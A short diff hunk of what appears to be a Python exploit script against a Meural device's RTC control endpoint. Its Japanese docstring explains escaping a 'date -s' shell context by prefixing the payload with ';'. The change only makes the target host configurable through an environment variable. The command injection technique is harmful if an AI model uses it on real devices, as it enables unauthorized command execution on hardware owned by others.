@@ -3,8 +3,8 @@
     sh -c 'eval date -s @<PAYLOAD>' 相当である事実に合わせ、
     payload先頭に ';' を置いてdateコンテキストから脱出するのが正解。
 """
-import time, urllib.request, sys
-HOST = "192.0.2.10"
+import os, time, urllib.request, sys
+HOST = os.environ.get("MEURAL_HOST", "192.0.2.10")
 URL_TMPL = f"http://{HOST}/remote/control_command/rtc/%s/"
 import urllib.parse
 
